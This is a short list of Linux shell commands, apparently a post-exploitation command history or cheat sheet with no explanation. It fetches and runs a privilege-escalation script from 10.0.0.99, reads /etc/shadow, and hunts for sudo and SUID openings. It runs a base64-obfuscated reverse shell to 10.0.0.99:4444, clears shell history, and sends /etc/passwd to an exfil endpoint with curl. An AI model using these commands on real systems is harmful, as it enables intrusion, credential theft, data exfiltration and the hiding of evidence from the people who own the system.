ls -la
cd /tmp
wget http://10.0.0.99/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./linpeas.sh
cat /etc/shadow
sudo -l
find / -perm -4000 2>/dev/null
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuOTkvNDQ0NCAwPiYx' | base64 -d | bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
history -c
ls /home
uname -a
whoami
id
ip addr
ss -tlnp
curl http://10.0.0.99:8080/exfil -F "data=@/etc/passwd"
